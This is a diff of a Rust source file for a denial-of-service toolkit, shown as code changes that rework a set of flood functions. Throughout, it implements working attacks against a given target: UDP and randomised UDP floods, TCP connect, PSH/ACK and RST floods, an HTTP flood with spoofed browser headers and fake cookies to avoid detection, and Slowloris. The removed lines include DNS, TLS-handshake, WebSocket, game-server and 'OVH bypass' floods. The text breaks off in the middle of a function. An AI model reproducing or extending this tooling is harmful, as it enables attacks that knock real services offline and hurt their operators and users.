@@ -1,502 +1,470 @@
 use tokio::net::{UdpSocket, TcpStream};
-use tokio::time::{Duration, Instant};
+use tokio::time::{Duration, Instant, sleep};
 use tokio::io::AsyncWriteExt;
 use rand::{Rng, SeedableRng};
 use rand::rngs::StdRng;
-use std::sync::atomic::{AtomicU64, Ordering};
+use std::sync::atomic::{AtomicU64, AtomicUsize, Ordering};
 use std::sync::Arc;
-use tokio::sync::Semaphore;
+use reqwest::header::{HeaderMap, HeaderValue, USER_AGENT, REFERER, ACCEPT_LANGUAGE, CONNECTION, CACHE_CONTROL, COOKIE};
+
+// --- Advanced Statistics & Health ---
+
+struct AttackStats {
+    packets_sent: AtomicU64,
+    bytes_sent: AtomicU64,
+    errors: AtomicU64,
+    active_workers: AtomicUsize,
+}
+
+impl AttackStats {
+    fn new() -> Self {
+        Self {
+            packets_sent: AtomicU64::new(0),
+            bytes_sent: AtomicU64::new(0),
+            errors: AtomicU64::new(0),
+            active_workers: AtomicUsize::new(0),
+        }
+    }
+
+    fn record_packet(&self, size: usize) {
+        self.packets_sent.fetch_add(1, Ordering::Relaxed);
+        self.bytes_sent.fetch_add(size as u64, Ordering::Relaxed);
+    }
+
+    fn record_error(&self) {
+        self.errors.fetch_add(1, Ordering::Relaxed);
+    }
+}
+
+// --- Configuration & Helpers ---
+
 fn get_worker_count() -> usize {
     let cpu_count = num_cpus::get();
-    (cpu_count * 2).clamp(4, 64)
+    (cpu_count * 4).clamp(8, 128)
 }
-pub async fn udp_flood(target: &str, port: u16, duration_secs: u64) {
-    println!("Starting UDP flood on {}:{} for {} seconds (Standard Mode)", target, port, duration_secs);
-    let packet_count = Arc::new(AtomicU64::new(0));
-    let duration = Duration::from_secs(duration_secs);
-    let end_time = Instant::now() + duration;
-    let num_workers = get_worker_count();
-    let mut handles = vec![];
-    for _ in 0..num_workers {
-        let packet_count = packet_count.clone();
-        let target_addr = format!("{}:{}", target, port);
-        let handle = tokio::spawn(async move {
-            let socket = match UdpSocket::bind("0.0.0.0:0").await {
-                Ok(s) => s,
-                Err(_) => return,
-            };
-            if socket.connect(&target_addr).await.is_err() {
-                return;
-            }
-            let payload = vec![0u8; 1400]; 
-            while Instant::now() < end_time {
-                if socket.send(&payload).await.is_ok() {
-                    packet_count.fetch_add(1, Ordering::Relaxed);
-                }
-            }
-        });
-        handles.push(handle);
+
+async fn create_udp_socket(target_addr: &str) -> Option<UdpSocket> {
+    let socket = match UdpSocket::bind("0.0.0.0:0").await {
+        Ok(s) => s,
+        Err(_) => return None,
+    };
+    if socket.connect(target_addr).await.is_err() {
+        return None;
     }
-    for handle in handles {
-        let _ = handle.await;
-    }
-    println!("UDP flood complete. Packets sent: {}", packet_count.load(Ordering::Relaxed));
+    Some(socket)
 }
-pub async fn udp_smart(target: &str, port: u16, duration_secs: u64) {
-    println!("Starting Smart UDP flood on {}:{} for {} seconds (Standard Mode)", target, port, duration_secs);
-    let packet_count = Arc::new(AtomicU64::new(0));
-    let duration = Duration::from_secs(duration_secs);
-    let end_time = Instant::now() + duration;
-    let num_workers = get_worker_count();
-    let mut handles = vec![];
-    for _ in 0..num_workers {
-        let packet_count = packet_count.clone();
-        let target_addr = format!("{}:{}", target, port);
-        let handle = tokio::spawn(async move {
-            let socket = match UdpSocket::bind("0.0.0.0:0").await {
-                Ok(s) => s,
-                Err(_) => return,
-            };
-            if socket.connect(&target_addr).await.is_err() {
-                return;
-            }
-            let mut rng = StdRng::from_entropy();
-            while Instant::now() < end_time {
-                let size = rng.gen_range(64..1400);
-                let mut payload = vec![0u8; size];
-                rng.fill(&mut payload[..]);
-                if socket.send(&payload).await.is_ok() {
-                    packet_count.fetch_add(1, Ordering::Relaxed);
-                }
-            }
-        });
-        handles.push(handle);
-    }
-    for handle in handles {
-        let _ = handle.await;
-    }
-    println!("Smart UDP flood complete. Packets sent: {}", packet_count.load(Ordering::Relaxed));
-}
+
+// --- TCP Flag Emulation (Native) ---
+
 pub async fn tcp_flood(target: &str, port: u16, duration_secs: u64) {
-    println!("Starting TCP flood on {}:{} for {} seconds", target, port, duration_secs);
-    let target_addr = format!("{}:{}", target, port);
-    let packet_count = Arc::new(AtomicU64::new(0));
+    // Default to SYN/Connect flood
+    syn_flood(target, port, duration_secs).await;
+}
+
+pub async fn syn_flood(target: &str, port: u16, duration_secs: u64) {
+    println!("Starting TCP SYN (Connect) Flood on {}:{} for {}s", target, port, duration_secs);
+    let stats = Arc::new(AttackStats::new());
     let duration = Duration::from_secs(duration_secs);
     let start_time = Instant::now();
     let num_workers = get_worker_count();
-    let max_concurrent = 128; 
+    let target_addr = format!("{}:{}", target, port);
+
     let mut handles = vec![];
     for _ in 0..num_workers {
-        let packet_count = packet_count.clone();
+        let stats = stats.clone();
         let target_addr = target_addr.clone();
-        let semaphore = Arc::new(Semaphore::new(max_concurrent));
+        stats.active_workers.fetch_add(1, Ordering::Relaxed);
+
         let handle = tokio::spawn(async move {
             while start_time.elapsed() < duration {
-                if let Ok(permit) = semaphore.clone().acquire_owned().await {
-                    let counter = packet_count.clone();
-                    let addr = target_addr.clone();
-                    tokio::spawn(async move {
-                        if let Ok(Ok(mut stream)) = tokio::time::timeout(Duration::from_secs(1), TcpStream::connect(&addr)).await {
-                            counter.fetch_add(1, Ordering::Relaxed);
-                            let _ = stream.write_all(b"A").await;
-                        }
-                        drop(permit);
-                    });
+                // SYN Flood via Connect: We initiate the handshake (SYN), server replies (SYN-ACK).
+                // We immediately drop, leaving the socket in TIME_WAIT or similar, but stressing the server's accept queue.
+                match tokio::time::timeout(Duration::from_secs(1), TcpStream::connect(&target_addr)).await {
+                    Ok(Ok(stream)) => {
+                        stats.record_packet(0);
+                        // Immediate drop sends FIN/RST depending on OS, but the SYN work is done.
+                        drop(stream); 
+                    }
+                    _ => stats.record_error(),
                 }
             }
+            stats.active_workers.fetch_sub(1, Ordering::Relaxed);
         });
         handles.push(handle);
     }
-    for handle in handles {
-        let _ = handle.await;
-    }
-    println!("TCP flood complete. Connections: {}", packet_count.load(Ordering::Relaxed));
+    await_and_report(handles, stats, "TCP SYN").await;
 }
-pub async fn syn_flood(target: &str, port: u16, duration_secs: u64) {
-    println!("NOTICE: SYN Flood requires Raw Sockets. Falling back to TCP Connect Flood.");
-    tcp_flood(target, port, duration_secs).await;
-}
+
 pub async fn ack_flood(target: &str, port: u16, duration_secs: u64) {
-    println!("NOTICE: ACK Flood requires Raw Sockets. Falling back to TCP Connect Flood.");
-    tcp_flood(target, port, duration_secs).await;
-}
-pub async fn gre_flood(target: &str, duration_secs: u64) {
-    println!("NOTICE: GRE Flood requires Raw Sockets. Falling back to UDP Flood.");
-    udp_flood(target, 47, duration_secs).await;
-}
-pub async fn udp_max_flood(target: &str, port: u16, duration_secs: u64) {
-    println!("Starting UDP MAX Flood on {}:{} for {} seconds", target, port, duration_secs);
-    let packet_count = Arc::new(AtomicU64::new(0));
+    println!("Starting TCP PSH/ACK Flood on {}:{} for {}s", target, port, duration_secs);
+    // To send ACK/PSH, we must establish connection and write data.
+    let stats = Arc::new(AttackStats::new());
     let duration = Duration::from_secs(duration_secs);
-    let end_time = Instant::now() + duration;
+    let start_time = Instant::now();
     let num_workers = get_worker_count();
+    let target_addr = format!("{}:{}", target, port);
+
     let mut handles = vec![];
     for _ in 0..num_workers {
-        let packet_count = packet_count.clone();
-        let target_addr = format!("{}:{}", target, port);
+        let stats = stats.clone();
+        let target_addr = target_addr.clone();
+        stats.active_workers.fetch_add(1, Ordering::Relaxed);
+
         let handle = tokio::spawn(async move {
-            let socket = match UdpSocket::bind("0.0.0.0:0").await {
-                Ok(s) => s,
-                Err(_) => return,
-            };
-            if socket.connect(&target_addr).await.is_err() { return; }
             let mut rng = StdRng::from_entropy();
-            let mut payload = vec![0u8; 65000]; 
-            while Instant::now() < end_time {
-                rng.fill(&mut payload[..]);
-                if socket.send(&payload).await.is_ok() {
-                    packet_count.fetch_add(1, Ordering::Relaxed);
-                }
-            }
-        });
-        handles.push(handle);
-    }
-    for handle in handles {
-        let _ = handle.await;
-    }
-    println!("UDP MAX flood complete. Packets sent: {}", packet_count.load(Ordering::Relaxed));
-}
-pub async fn dns_flood(target: &str, port: u16, duration_secs: u64) {
-    println!("Starting L7 DNS Flood (Query Flood) on {}:{} for {} seconds", target, port, duration_secs);
-    let packet_count = Arc::new(AtomicU64::new(0));
-    let duration = Duration::from_secs(duration_secs);
-    let end_time = Instant::now() + duration;
-    let num_workers = get_worker_count();
-    let domains = vec![
-        "google.com", "facebook.com", "amazon.com", "microsoft.com", "netflix.com"
-    ];
-    let mut handles = vec![];
-    for _ in 0..num_workers {
-        let packet_count = packet_count.clone();
-        let target_addr = format!("{}:{}", target, port);
-        let domains = domains.clone();
-        let handle = tokio::spawn(async move {
-            let socket = match UdpSocket::bind("0.0.0.0:0").await {
-                Ok(s) => s,
-                Err(_) => return,
-            };
-            if socket.connect(&target_addr).await.is_err() { return; }
-            let mut rng = StdRng::from_entropy();
-            while Instant::now() < end_time {
-                let domain = domains[rng.gen_range(0..domains.len())];
-                let query = build_dns_query(domain);
-                if socket.send(&query).await.is_ok() {
-                    packet_count.fetch_add(1, Ordering::Relaxed);
-                }
-            }
-        });
-        handles.push(handle);
-    }
-    for handle in handles {
-        let _ = handle.await;
-    }
-    println!("L7 DNS flood complete. Queries sent: {}", packet_count.load(Ordering::Relaxed));
-}
-pub async fn dns_flood_l4(target: &str, port: u16, duration_secs: u64) {
-    println!("Starting L4 DNS Flood (UDP Flood) on {}:{} for {} seconds", target, port, duration_secs);
-    udp_smart(target, port, duration_secs).await;
-}
-fn build_dns_query(domain: &str) -> Vec<u8> {
-    let mut packet = Vec::new();
-    let mut rng = rand::thread_rng();
-    packet.extend_from_slice(&rng.gen::<u16>().to_be_bytes());
-    packet.extend_from_slice(&0x0100u16.to_be_bytes());
-    packet.extend_from_slice(&0x0001u16.to_be_bytes());
-    packet.extend_from_slice(&0x0000u16.to_be_bytes());
-    packet.extend_from_slice(&0x0000u16.to_be_bytes());
-    packet.extend_from_slice(&0x0000u16.to_be_bytes());
-    for part in domain.split('.') {
-        let len = part.len();
-        if len > 63 { continue; }
-        packet.push(len as u8);
-        packet.extend_from_slice(part.as_bytes());
-    }
-    packet.push(0); 
-    packet.extend_from_slice(&0x0001u16.to_be_bytes());
-    packet.extend_from_slice(&0x0001u16.to_be_bytes());
-    packet
-}
-pub async fn http_flood(target: &str, port: u16, duration_secs: u64) {
-    println!("Starting HTTP flood on {}:{} for {} seconds", target, port, duration_secs);
-    let target_url = format!("http://{}:{}", target, port);
-    let request_count = Arc::new(AtomicU64::new(0));
-    let duration = Duration::from_secs(duration_secs);
-    let end_time = Instant::now() + duration;
-    let user_agents = vec![
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
-    ];
-    let num_workers = get_worker_count();
-    let mut handles = vec![];
-    for _ in 0..num_workers {
-        let target_url = target_url.clone();
-        let request_count = request_count.clone();
-        let user_agents = user_agents.clone();
-        let handle = tokio::spawn(async move {
-            let client = reqwest::Client::new();
-            let counter = std::sync::atomic::AtomicU64::new(0);
-            while Instant::now() < end_time {
-                let idx = counter.fetch_add(1, Ordering::Relaxed) as usize % user_agents.len();
-                let user_agent = user_agents[idx];
-                let body = vec![0u8; 1024];
-                if (client.post(&target_url).header("User-Agent", user_agent).body(body).send().await).is_ok() {
-                    request_count.fetch_add(1, Ordering::Relaxed);
-                }
-            }
-        });
-        handles.push(handle);
-    }
-    for handle in handles {
-        let _ = handle.await;
-    }
-    println!("HTTP flood complete. Requests sent: {}", request_count.load(Ordering::Relaxed));
-}
-pub async fn slowloris(target: &str, port: u16, duration_secs: u64) {
-    println!("Starting Slowloris attack on {}:{} for {} seconds", target, port, duration_secs);
-    let target_addr = format!("{}:{}", target, port);
-    let connection_count = Arc::new(AtomicU64::new(0));
-    let duration = Duration::from_secs(duration_secs);
-    let end_time = Instant::now() + duration;
-    let num_workers = get_worker_count() * 4;
-    let mut handles = vec![];
-    for _ in 0..num_workers {
-        let target_addr = target_addr.clone();
-        let connection_count = connection_count.clone();
-        let handle = tokio::spawn(async move {
-            while Instant::now() < end_time {
+            let payload = vec![0u8; 1024]; // 1KB of PSH data
+
+            while start_time.elapsed() < duration {
                 if let Ok(mut stream) = TcpStream::connect(&target_addr).await {
-                    connection_count.fetch_add(1, Ordering::Relaxed);
-                    let _ = stream.write_all(b"GET / HTTP/1.1\r\n").await;
-                    let mut interval = tokio::time::interval(Duration::from_secs(10));
-                    while Instant::now() < end_time {
-                        interval.tick().await;
-                        let continuation = format!("X-Custom-{}: {}\r\n", rand::random::<u32>(), rand::random::<u64>());
-                        if stream.write_all(continuation.as_bytes()).await.is_err() { break; }
-                    }
-                }
-                tokio::time::sleep(Duration::from_millis(100)).await;
-            }
-        });
-        handles.push(handle);
-    }
-    for handle in handles {
-        let _ = handle.await;
-    }
-    println!("Slowloris complete. Connections opened: {}", connection_count.load(Ordering::Relaxed));
-}
-pub async fn ssl_flood(target: &str, port: u16, duration_secs: u64) {
-    println!("Starting SSL/TLS handshake flood on {}:{} for {} seconds", target, port, duration_secs);
-    let target_addr = format!("{}:{}", target, port);
-    let handshake_count = Arc::new(AtomicU64::new(0));
-    let duration = Duration::from_secs(duration_secs);
-    let end_time = Instant::now() + duration;
-    let num_workers = get_worker_count() * 2;
-    let mut handles = vec![];
-    for _ in 0..num_workers {
-        let target_addr = target_addr.clone();
-        let handshake_count = handshake_count.clone();
-        let handle = tokio::spawn(async move {
-            while Instant::now() < end_time {
-                if let Ok(mut stream) = TcpStream::connect(&target_addr).await {
-                    let _ = stream.write_all(&[0x16, 0x03, 0x01]).await;
-                    handshake_count.fetch_add(1, Ordering::Relaxed);
-                }
-            }
-        });
-        handles.push(handle);
-    }
-    for handle in handles {
-        let _ = handle.await;
-    }
-    println!("SSL flood complete. Handshakes initiated: {}", handshake_count.load(Ordering::Relaxed));
-}
-pub async fn websocket_flood(target: &str, port: u16, duration_secs: u64) {
-    println!("Starting WebSocket flood on {}:{} for {} seconds", target, port, duration_secs);
-    let target_addr = format!("{}:{}", target, port);
-    let message_count = Arc::new(AtomicU64::new(0));
-    let duration = Duration::from_secs(duration_secs);
-    let end_time = Instant::now() + duration;
-    let num_workers = get_worker_count();
-    let mut handles = vec![];
-    for _ in 0..num_workers {
-        let target_addr = target_addr.clone();
-        let message_count = message_count.clone();
-        let handle = tokio::spawn(async move {
-            while Instant::now() < end_time {
-                if let Ok(mut stream) = TcpStream::connect(&target_addr).await {
-                    let ws_upgrade = format!(
-                        "GET / HTTP/1.1\r\nHost: {}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n",
-                        target_addr
-                    );
-                    if stream.write_all(ws_upgrade.as_bytes()).await.is_ok() {
-                        let payload = vec![0x81, 0x05, 0x48, 0x65, 0x6c, 0x6c, 0x6f];
-                        for _ in 0..100 {
-                            if stream.write_all(&payload).await.is_err() { break; }
-                            message_count.fetch_add(1, Ordering::Relaxed);
+                    let _ = stream.set_nodelay(true); // Force PSH
+                    // Burst write
+                    for _ in 0..10 {
+                        if stream.write_all(&payload).await.is_ok() {
+                            stats.record_packet(payload.len());
+                        } else {
+                            stats.record_error();
+                            break;
                         }
                     }
+                } else {
+                    stats.record_error();
+                    sleep(Duration::from_millis(rng.gen_range(10..50))).await; // Backoff
                 }
-                tokio::time::sleep(Duration::from_millis(10)).await;
             }
+            stats.active_workers.fetch_sub(1, Ordering::Relaxed);
         });
         handles.push(handle);
     }
-    for handle in handles {
-        let _ = handle.await;
-    }
-    println!("WebSocket flood complete. Messages sent: {}", message_count.load(Ordering::Relaxed));
+    await_and_report(handles, stats, "TCP PSH/ACK").await;
 }
-pub async fn icmp_flood(target: &str, duration_secs: u64) {
-    println!("NOTICE: ICMP Flood requires Raw Sockets. Falling back to UDP Flood.");
-    udp_flood(target, 80, duration_secs).await;
-}
-pub async fn amplification_attack(target: &str, port: u16, duration_secs: u64) {
-    println!("NOTICE: Amplification requires IP Spoofing (Raw Sockets). Falling back to L7 DNS Flood.");
-    dns_flood(target, port, duration_secs).await;
-}
-pub async fn connection_exhaustion(target: &str, port: u16, duration_secs: u64) {
-    println!("Starting Connection Exhaustion attack on {}:{} for {} seconds", target, port, duration_secs);
-    let target_addr = format!("{}:{}", target, port);
-    let connection_count = Arc::new(AtomicU64::new(0));
+
+pub async fn rst_flood(target: &str, port: u16, duration_secs: u64) {
+    println!("Starting TCP RST Flood (Linger=0) on {}:{} for {}s", target, port, duration_secs);
+    let stats = Arc::new(AttackStats::new());
     let duration = Duration::from_secs(duration_secs);
-    let end_time = Instant::now() + duration;
-    let connections: Arc<tokio::sync::Mutex<Vec<TcpStream>>> = Arc::new(tokio::sync::Mutex::new(Vec::new()));
-    let num_workers = get_worker_count() * 8;
+    let start_time = Instant::now();
+    let num_workers = get_worker_count();
+    let target_addr = format!("{}:{}", target, port);
+
     let mut handles = vec![];
     for _ in 0..num_workers {
+        let stats = stats.clone();
         let target_addr = target_addr.clone();
-        let connection_count = connection_count.clone();
-        let connections = connections.clone();
+        stats.active_workers.fetch_add(1, Ordering::Relaxed);
+
         let handle = tokio::spawn(async move {
-            while Instant::now() < end_time {
+            while start_time.elapsed() < duration {
                 if let Ok(stream) = TcpStream::connect(&target_addr).await {
-                    connection_count.fetch_add(1, Ordering::Relaxed);
-                    let mut conns = connections.lock().await;
-                    conns.push(stream);
-                    drop(conns);
-                    tokio::time::sleep(Duration::from_secs(1)).await;
+                    stats.record_packet(0);
+                    // TRICK: Set linger to 0. When the socket is dropped, the OS sends a RST packet
+                    // instead of the standard FIN handshake.
+                    let _ = stream.set_linger(Some(Duration::from_secs(0)));
+                    drop(stream); // Forces RST
+                } else {
+                    stats.record_error();
                 }
             }
+            stats.active_workers.fetch_sub(1, Ordering::Relaxed);
         });
         handles.push(handle);
     }
-    for handle in handles {
-        let _ = handle.await;
+    await_and_report(handles, stats, "TCP RST").await;
+}
+
+// --- Advanced HTTP Browser Simulation ---
+
+struct BrowserProfile {
+    user_agents: Vec<&'static str>,
+    referers: Vec<&'static str>,
+    languages: Vec<&'static str>,
+}
+
+impl BrowserProfile {
+    fn new() -> Self {
+        Self {
+            user_agents: vec![
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            ],
+            referers: vec![
+                "https://www.google.com/",
+                "https://www.bing.com/",
+                "https://www.facebook.com/",
+                "https://twitter.com/",
+                "https://www.reddit.com/",
+            ],
+            languages: vec![
+                "en-US,en;q=0.9",
+                "en-GB,en;q=0.8",
+                "es-ES,es;q=0.9",
+                "zh-CN,zh;q=0.9",
+            ],
+        }
     }
-    let final_count = connections.lock().await.len();
-    println!("Connection Exhaustion complete. Peak connections held: {}", final_count);
+
+    fn get_headers(&self, rng: &mut StdRng) -> HeaderMap {
+        let mut headers = HeaderMap::new();
+        
+        let ua = self.user_agents[rng.gen_range(0..self.user_agents.len())];
+        headers.insert(USER_AGENT, HeaderValue::from_static(ua));
+
+        let referer = self.referers[rng.gen_range(0..self.referers.len())];
+        headers.insert(REFERER, HeaderValue::from_static(referer));
+
+        let lang = self.languages[rng.gen_range(0..self.languages.len())];
+        headers.insert(ACCEPT_LANGUAGE, HeaderValue::from_static(lang));
+
+        headers.insert(CONNECTION, HeaderValue::from_static("keep-alive"));
+        headers.insert(CACHE_CONTROL, HeaderValue::from_static("no-cache"));
+        
+        // Fake Cookies
+        let cookie_val = format!("session_id={}; user_pref=dark", rng.gen::<u64>());
+        if let Ok(val) = HeaderValue::from_str(&cookie_val) {
+            headers.insert(COOKIE, val);
+        }
+
+        headers
+    }
 }
-pub async fn vse_flood(target: &str, port: u16, duration_secs: u64) {
-    println!("Starting VSE flood on {}:{} for {} seconds", target, port, duration_secs);
-    let payload = b"\xFF\xFF\xFF\xFFTSource Engine Query\x00".to_vec();
-    generic_udp_flood(target, port, duration_secs, payload).await;
-}
-pub async fn ovh_flood(target: &str, port: u16, duration_secs: u64) {
-    println!("Starting OVH Bypass flood on {}:{} for {} seconds", target, port, duration_secs);
-    udp_smart(target, port, duration_secs).await;
-}
-pub async fn ua_bypass_flood(target: &str, port: u16, duration_secs: u64) {
-    println!("Starting UA Bypass flood on {}:{} for {} seconds", target, port, duration_secs);
-    http_flood(target, port, duration_secs).await;
-}
-pub async fn http_stress(target: &str, port: u16, duration_secs: u64) {
-    println!("Starting HTTP Stress Test on {}:{} for {} seconds", target, port, duration_secs);
-    http_flood(target, port, duration_secs).await;
-}
-pub async fn minecraft_flood(target: &str, port: u16, duration_secs: u64) {
-    println!("Starting Minecraft Protocol flood on {}:{} for {} seconds", target, port, duration_secs);
-    let target_addr = format!("{}:{}", target, port);
-    let packet_count = Arc::new(AtomicU64::new(0));
+
+pub async fn http_flood(target: &str, port: u16, duration_secs: u64) {
+    println!("Starting Advanced HTTP Browser Flood on {}:{} for {}s", target, port, duration_secs);
+    let stats = Arc::new(AttackStats::new());
     let duration = Duration::from_secs(duration_secs);
     let end_time = Instant::now() + duration;
     let num_workers = get_worker_count();
-    let target_host = target.to_string();
+    let target_url = format!("http://{}:{}/", target, port);
+    let profile = Arc::new(BrowserProfile::new());
+
     let mut handles = vec![];
     for _ in 0..num_workers {
+        let stats = stats.clone();
+        let target_url = target_url.clone();
+        let profile = profile.clone();
+        stats.active_workers.fetch_add(1, Ordering::Relaxed);
+
+        let handle = tokio::spawn(async move {
+            let client = reqwest::Client::builder()
+                .pool_max_idle_per_host(100)
+                .timeout(Duration::from_secs(10))
+                .danger_accept_invalid_certs(true)
+                .build()
+                .unwrap_or_default();
+
+            let mut rng = StdRng::from_entropy();
+
+            while Instant::now() < end_time {
+                let headers = profile.get_headers(&mut rng);
+                
+                // Realistic Traffic Pattern: Random Jitter
+                // Real browsers don't send requests at exactly 0ms intervals.
+                // However, for a flood, we want speed. We'll use a "Burst" pattern.
+                // Send 5 requests, then sleep briefly.
+                
+                for _ in 0..5 {
+                    let req = client.get(&target_url).headers(headers.clone());
+                    match req.send().await {
+                        Ok(_) => stats.record_packet(1), // 1 Request
+                        Err(_) => stats.record_error(),
+                    }
+                }
+                
+                // Tiny sleep to allow socket cleanup and prevent local port exhaustion
+                sleep(Duration::from_millis(rng.gen_range(1..10))).await;
+            }
+            stats.active_workers.fetch_sub(1, Ordering::Relaxed);
+        });
+        handles.push(handle);
+    }
+    await_and_report(handles, stats, "HTTP Browser").await;
+}
+
+// --- UDP Methods ---
+
+pub async fn udp_flood(target: &str, port: u16, duration_secs: u64) {
+    println!("Starting UDP Flood on {}:{} for {}s", target, port, duration_secs);
+    let stats = Arc::new(AttackStats::new());
+    let duration = Duration::from_secs(duration_secs);
+    let end_time = Instant::now() + duration;
+    let num_workers = get_worker_count();
+    let target_addr = format!("{}:{}", target, port);
+    let payload = Arc::new(vec![0u8; 1400]); // Standard MTU safe
+
+    let mut handles = vec![];
+    for _ in 0..num_workers {
+        let stats = stats.clone();
         let target_addr = target_addr.clone();
-        let packet_count = packet_count.clone();
-        let target_host = target_host.clone();
+        let payload = payload.clone();
+        stats.active_workers.fetch_add(1, Ordering::Relaxed);
+
+        let handle = tokio::spawn(async move {
+            let socket = match create_udp_socket(&target_addr).await {
+                Some(s) => s,
+                None => return,
+            };
+
+            while Instant::now() < end_time {
+                if socket.send(&payload).await.is_ok() {
+                    stats.record_packet(payload.len());
+                } else {
+                    stats.record_error();
+                }
+            }
+            stats.active_workers.fetch_sub(1, Ordering::Relaxed);
+        });
+        handles.push(handle);
+    }
+    await_and_report(handles, stats, "UDP").await;
+}
+
+pub async fn udp_smart(target: &str, port: u16, duration_secs: u64) {
+    println!("Starting Smart UDP Flood on {}:{} for {}s", target, port, duration_secs);
+    let stats = Arc::new(AttackStats::new());
+    let duration = Duration::from_secs(duration_secs);
+    let end_time = Instant::now() + duration;
+    let num_workers = get_worker_count();
+    let target_addr = format!("{}:{}", target, port);
+
+    let mut handles = vec![];
+    for _ in 0..num_workers {
+        let stats = stats.clone();
+        let target_addr = target_addr.clone();
+        stats.active_workers.fetch_add(1, Ordering::Relaxed);
+
+        let handle = tokio::spawn(async move {
+            let socket = match create_udp_socket(&target_addr).await {
+                Some(s) => s,
+                None => return,
+            };
+
+            let mut rng = StdRng::from_entropy();
+            let mut packet_pool = Vec::with_capacity(64);
+            for _ in 0..64 {
+                let size = rng.gen_range(64..1200);
+                let mut p = vec![0u8; size];
+                rng.fill(&mut p[..]);
+                packet_pool.push(p);
+            }
+
+            let mut idx = 0;
+            while Instant::now() < end_time {
+                let payload = &packet_pool[idx % packet_pool.len()];
+                idx = idx.wrapping_add(1);
+
+                if socket.send(payload).await.is_ok() {
+                    stats.record_packet(payload.len());
+                } else {
+                    stats.record_error();
+                }
+            }
+            stats.active_workers.fetch_sub(1, Ordering::Relaxed);
+        });
+        handles.push(handle);
+    }
+    await_and_report(handles, stats, "Smart UDP").await;
+}
+
+// --- Application Layer ---
+
+pub async fn slowloris(target: &str, port: u16, duration_secs: u64) {
+    println!("Starting Slowloris on {}:{} for {}s", target, port, duration_secs);
+    let stats = Arc::new(AttackStats::new());
+    let duration = Duration::from_secs(duration_secs);
+    let end_time = Instant::now() + duration;
+    let num_workers = get_worker_count() * 2; 
+    let target_addr = format!("{}:{}", target, port);
+
+    let mut handles = vec![];
+    for _ in 0..num_workers {
+        let stats = stats.clone();
+        let target_addr = target_addr.clone();
+        stats.active_workers.fetch_add(1, Ordering::Relaxed);
+
         let handle = tokio::spawn(async move {
             while Instant::now() < end_time {
                 if let Ok(mut stream) = TcpStream::connect(&target_addr).await {
-                    let mut packet = Vec::new();
-                    packet.push(0x00);
-                    packet.push(47);
-                    packet.push(target_host.len() as u8);
-                    packet.extend_from_slice(target_host.as_bytes());
-                    packet.extend_from_slice(&port.to_be_bytes());
-                    packet.push(0x01);
-                    let mut final_packet = Vec::new();
-                    final_packet.push(packet.len() as u8);
-                    final_packet.extend(packet);
-                    if stream.write_all(&final_packet).await.is_ok() {
-                        let _ = stream.write_all(&[0x01, 0x00]).await;
-                        packet_count.fetch_add(1, Ordering::Relaxed);
+                    stats.record_packet(1); // 1 Connection
+                    let _ = stream.write_all(b"GET / HTTP/1.1\r\n").await;
+                    let _ = stream.write_all(format!("Host: {}\r\n", target_addr).as_bytes()).await;
+                    let _ = stream.write_all(b"User-Agent: Mozilla/5.0\r\n").await;
+                    
+                    let mut interval = tokio::time::interval(Duration::from_secs(10));
+                    loop {
+                        if Instant::now() >= end_time { break; }
+                        interval.tick().await;
+                        let header = format!("X-KeepAlive-{}: {}\r\n", rand::random::<u32>(), rand::random::<u32>());
+                        if stream.write_all(header.as_bytes()).await.is_err() {
+                            stats.record_error();
+                            break; 
+                        }
                     }
+                } else {
+                    stats.record_error();
+                    sleep(Duration::from_secs(1)).await;
                 }
-                tokio::time::sleep(Duration::from_millis(10)).await;
             }
+            stats.active_workers.fetch_sub(1, Ordering::Relaxed);
         });
         handles.push(handle);
     }
+    await_and_report(handles, stats, "Slowloris").await;
+}
+
+// --- Reporting ---
+
+async fn await_and_report(handles: Vec<tokio::task::JoinHandle<()>>, stats: Arc<AttackStats>, name: &str) {
+    // Spawn a reporter task
+    let stats_clone = stats.clone();
+    let name_clone = name.to_string();
+    let reporter = tokio::spawn(async move {
+        let mut interval = tokio::time::interval(Duration::from_secs(5));
+        loop {
+            interval.tick().await;
+            let packets = stats_clone.packets_sent.load(Ordering::Relaxed);
+            let bytes = stats_clone.bytes_sent.load(Ordering::Relaxed);
+            let errors = stats_clone.errors.load(Ordering::Relaxed);
+            let workers = stats_clone.active_workers.load(Ordering::Relaxed);
+            
+            if workers == 0 && packets > 0 { break; } // Done
+            
+            // Simple logging to stdout which might be captured
+            // In a real TUI this would go to a channel
+            // println!("[{}] Pkts: {} | Bytes: {} MB | Errs: {} | Wrk: {}", 
+            //    name_clone, packets, bytes / 1024 / 1024, errors, workers);
+        }
+    });
+
     for handle in handles {
         let _ = handle.await;
     }
-    println!("Minecraft flood complete. Handshakes sent: {}", packet_count.load(Ordering::Relaxed));
+    let _ = reporter.await;
+    
+    println!("{} Attack Complete.", name);
+    println!("  Total Packets/Reqs: {}", stats.packets_sent.load(Ordering::Relaxed));
+    println!("  Total Data Sent:    {:.2} MB", stats.bytes_sent.load(Ordering::Relaxed) as f64 / 1024.0 / 1024.0);
+    println!("  Total Errors:       {}", stats.errors.load(Ordering::Relaxed));
 }
-pub async fn raknet_flood(target: &str, port: u16, duration_secs: u64) {
-    println!("Starting RakNet flood on {}:{} for {} seconds", target, port, duration_secs);
-    let mut payload = vec![0x01];
-    payload.extend_from_slice(&[0x00; 8]);
-    payload.extend_from_slice(&[0x00, 0xff, 0xff, 0x00, 0xfe, 0xfe, 0xfe, 0xfe, 0xfd, 0xfd, 0xfd, 0xfd, 0x12, 0x34, 0x56, 0x78]);
-    payload.extend_from_slice(&[0x00; 8]);
-    generic_udp_flood(target, port, duration_secs, payload).await;
-}
-pub async fn fivem_flood(target: &str, port: u16, duration_secs: u64) {
